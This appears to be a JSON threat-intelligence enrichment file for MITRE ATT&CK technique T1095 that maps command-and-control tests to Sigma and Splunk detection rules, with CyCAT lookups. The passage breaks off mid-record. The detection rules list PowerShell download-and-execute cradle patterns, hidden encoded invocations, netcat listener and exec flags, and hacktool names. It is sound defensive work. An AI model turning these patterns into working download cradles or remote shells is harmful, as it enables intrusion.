@@ -1,0 +1,328 @@
+{
+    "id": "T1095",
+    "name": "Non-Application Layer Protocol",
+    "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\nBecause ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
+    "platforms": "Windows, Linux, macOS, Network",
+    "kill_chain_phases": "Command and Control",
+    "data_sources": "Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content",
+    "detection": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
+    "url": "https://attack.mitre.org/techniques/T1095",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1095",
+                "atomic_attack_guid": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e",
+                "atomic_attack_name": "Powercat C2",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Program Names",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
+                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1095",
+                "atomic_attack_guid": "0268e63c-e244-42db-bef7-72a9e59fc1fc",
+                "atomic_attack_name": "ICMP C2",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "e31033fc-33f0-4020-9a16-faf9b31cbf08",
+                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                    "399d9038-b100-43ef-b28d-a5065106b935",
+                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                    "c21d5a77-d422-4a69-acd7-2c53c1faa34b",
+                    "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
+                    "c5b20776-639a-49bf-94c7-84f912b91c15",
+                    "ede05abc-2c9e-4624-9944-9ff17fdc0bf5",
+                    "5df8df26-fe0e-4858-94a7-6cf71d9519c9"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e31033fc-33f0-4020-9a16-faf9b31cbf08",
+                        "lookup_data": {
+                            "description": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network",
+                            "raw": "author: frack113, Florian Roth\ndate: 2021/07/21\ndescription: Detects execution of Netcat. Adversaries may use a non-application layer\n  protocol for communication between host and C2 server or among infected hosts within\n  a network\ndetection:\n  condition: 1 of selection_*\n  selection_cmdline:\n    CommandLine|contains:\n    - ' -lvp '\n    - ' -lvnp'\n    - ' -l -v -p '\n    - ' -lv -p '\n    - ' -l --proxy-type http '\n    - ' -vnl --exec '\n    - ' -vnl -e '\n    - ' --lua-exec '\n    - ' --sh-exec '\n  selection_img:\n    Image|endswith:\n    - \\nc.exe\n    - \\ncat.exe\n    - \\netcat.exe\nfalsepositives:\n- Legitimate ncat use\nid: e31033fc-33f0-4020-9a16-faf9b31cbf08\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/02\nreferences:\n- https://nmap.org/ncat/\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\n- https://www.revshells.com/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1095\ntitle: Netcat Suspicious Execution\n",
+                            "sigma:id": "e31033fc-33f0-4020-9a16-faf9b31cbf08",
+                            "title": "Netcat Suspicious Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                        "lookup_data": {
+                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666603345",
+                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "399d9038-b100-43ef-b28d-a5065106b935",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1095",
+                            "mitre-cti:description": "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",
+                            "mitre-cti:name": "Standard Non-Application Layer Protocol Mitigation",
+                            "mitre-cti:type": "course-of-action",
+                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--399d9038-b100-43ef-b28d-a5065106b935', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1095', 'external_id': 'T1095'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}], 'modified': '2019-07-25T12:01:33.997Z', 'name': 'Standard Non-Application Layer Protocol Mitigation', 'description': 'Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.\\n\\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                        "lookup_data": {
+                            "description": "UNC3524: Eye Spy on Your Email",
+                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652459344",
+                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c21d5a77-d422-4a69-acd7-2c53c1faa34b",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1095",
+                            "mitre-cti:description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
+                            "mitre-cti:name": "Non-Application Layer Protocol",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows', 'Linux', 'macOS', 'Network'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ryan Becwar'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b', 'type': 'attack-pattern', 'created': '2017-05-31T21:31:10.728Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1095', 'url': 'https://attack.mitre.org/techniques/T1095'}, {'url': 'http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29', 'description': 'Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014.', 'source_name': 'Wikipedia OSI'}, {'source_name': 'Cisco Synful Knock Evolution', 'url': 'https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices', 'description': 'Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.'}, {'url': 'http://support.microsoft.com/KB/170292', 'description': 'Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014.', 'source_name': 'Microsoft ICMP'}, {'source_name': 'Cisco Blog Legacy Device Attacks', 'url': 'https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954', 'description': 'Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2022-02-17T15:38:54.578Z', 'name': 'Non-Application Layer Protocol', 'description': 'Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_detection': 'Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \\n\\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.', 'x_mitre_version': '2.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network 